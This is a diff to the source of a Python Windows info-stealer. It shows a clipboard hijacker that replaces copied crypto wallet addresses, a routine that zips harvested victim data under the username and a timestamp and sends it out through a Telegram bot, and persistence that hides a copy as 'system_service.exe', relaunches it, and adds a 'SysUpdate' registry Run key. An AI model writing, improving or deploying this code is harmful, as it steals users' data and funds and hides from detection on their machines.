@@ -278,45 +278,57 @@ def clipper():
                 win32clipboard.SetClipboardText(CLIP_WALLETS[coin])
                 win32clipboard.CloseClipboard()
     except: pass
+    
+import datetime
+
 
 # === ZIP & TELEGRAM ===
 def send_zip_to_telegram():
-    zip_name = f"{getpass.getuser()}_exfil_data"
-    shutil.make_archive(zip_name, "zip", EXTRACT_FOLDER)
     try:
-        with open(f"{zip_name}.zip", "rb") as f:
-            requests.post(
+        zip_name = f"{getpass.getuser()}_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}"
+        zip_path = shutil.make_archive(zip_name, "zip", EXTRACT_FOLDER)
+
+        with open(zip_path, "rb") as f:
+            response = requests.post(
                 f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",
                 data={"chat_id": CHAT_ID},
-                files={"document": (f"{zip_name}.zip", f)}
+                files={"document": (os.path.basename(zip_path), f)}
             )
-        os.remove(f"{zip_name}.zip")
+
+        os.remove(zip_path)
+        print("[+] Data sent to Telegram.")
     except Exception as e:
         print(f"[!] Telegram send failed: {e}")
+
 
 # === PERSISTENCE ===
 def persist():
     try:
-        exe_name = os.path.basename(sys.executable) if getattr(sys, 'frozen', False) else os.path.basename(__file__)
-        dest_path = os.path.join(EXTRACT_FOLDER, exe_name)
+        current_path = os.path.abspath(sys.argv[0])  # Use sys.argv[0] to ensure correct .exe
+        dest_path = os.path.join(EXTRACT_FOLDER, "system_service.exe")
 
-        if not os.path.exists(dest_path):
-            shutil.copy2(sys.executable if getattr(sys, 'frozen', False) else __file__, dest_path)
-            subprocess.call(f'attrib +h "{dest_path}"', shell=True)
+        # Copy to hidden location if not already running from there
+        if current_path.lower() != dest_path.lower():
+            if not os.path.exists(dest_path):
+                shutil.copy2(current_path, dest_path)
+                subprocess.call(f'attrib +h "{dest_path}"', shell=True)
 
-        reg_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
-        reg_key = "SysUpdate"
+            # Relaunch from hidden path
+            subprocess.Popen(f'"{dest_path}"', shell=True)
+            os._exit(0)  # Exit current instance
 
-        with winreg.OpenKey(winreg.HKEY_CURRENT_USER, reg_path, 0, winreg.KEY_SET_VALUE) as key:
-            winreg.SetValueEx(key, reg_key, 0, winreg.REG_SZ, dest_path)
-
-        log_path = os.path.join(EXTRACT_FOLDER, "persistence_log.txt")
-        with open(log_path, "w") as f:
-            f.write(f"Persistence set to: {dest_path}\n")
+        # Always re-add to registry on launch
+        reg_key = winreg.OpenKey(
+            winreg.HKEY_CURRENT_USER,
+            r"Software\Microsoft\Windows\CurrentVersion\Run",
+            0, winreg.KEY_SET_VALUE
+        )
+        winreg.SetValueEx(reg_key, "SysUpdate", 0, winreg.REG_SZ, dest_path)
+        winreg.CloseKey(reg_key)
 
     except Exception as e:
-        with open(os.path.join(EXTRACT_FOLDER, "persistence_error.txt"), "w") as f:
-            f.write(f"Persist failed: {e}")
+        print(f"[!] Persistence error: {e}")
+
 
 
 def fake_input():
